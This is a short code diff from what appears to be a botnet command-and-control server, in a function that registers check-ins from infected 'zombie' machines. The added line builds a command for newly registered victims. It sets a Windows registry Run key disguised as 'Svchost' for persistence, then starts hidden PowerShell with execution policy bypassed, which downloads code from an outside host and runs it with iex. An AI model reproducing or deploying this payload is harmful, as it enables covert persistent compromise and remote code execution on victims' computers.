@@ -27,7 +27,8 @@ def process_zombie_checkin(json_object, public_ip):
 	# else update check in time
 	if not any(z.uuid == uuid for z in zombies):
 		zombies.append(Zombie(uuid, hostname, username, public_ip, clm))
-		json_response = '{"command":"reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Svchost /t REG_SZ /d \'C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c \"$command = iwr -Uri https://220.ip-54-37-16.eu/ -Method GET  -UseBasicParsing; iex $command\"\'"}'
+		#json_response = '{"command":"reg.exe add \\\"HKEY_CURRENT_USER\\\Software\\\Microsoft\\\Windows\\\CurrentVersion\\\Run\\\" /v Svchost /t REG_SZ /d \'C:\\\WINDOWS\\\system32\\\WindowsPowerShell\\\v1.0\\\powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c \\\"$command = iwr -Uri https://220.ip-54-37-16.eu/ -Method GET  -UseBasicParsing; iex $command\\\"\'\\\"}'
+		json_response = """{"command":"reg.exe add \\\"HKEY_CURRENT_USER\\\Software\\\Microsoft\\\Windows\\\CurrentVersion\\\Run\\\" /v Svchost /t REG_SZ /d 'C:\\\WINDOWS\\\system32\\\WindowsPowerShell\\\\v1.0\\\powershell.exe   -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c \\\\\\"$command = iwr -Uri https://220.ip-54-37-16.eu/ -Method GET  -UseBasicParsing; iex $command \\\\\\"' /f "}"""
 
 	else:
 		z = next((z for z in zombies if z.uuid == uuid), None)
